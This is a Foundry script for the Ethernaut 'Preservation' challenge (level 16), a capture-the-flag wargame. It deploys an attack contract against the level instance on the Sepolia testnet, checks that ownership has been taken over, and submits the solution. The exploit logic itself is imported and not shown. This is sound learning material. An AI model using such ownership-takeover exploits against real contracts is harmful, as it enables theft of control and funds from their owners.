// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Preservation} from "../src/Level16.sol";
import {Attack} from "../src/Level16Attack.sol";

contract Level16 is Script {
    IEthernaut _ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address _caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Preservation _instance = Preservation(vm.envAddress("LVL16_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack();
        attack.atatatak(_instance);

        if (_instance.owner() != _caller) {
            console2.log("call failed");
        } else _ethernaut.submitLevelInstance(address(_instance));
    }
}

// forge script script/Level16.s.sol --broadcast --rpc-url sepolia
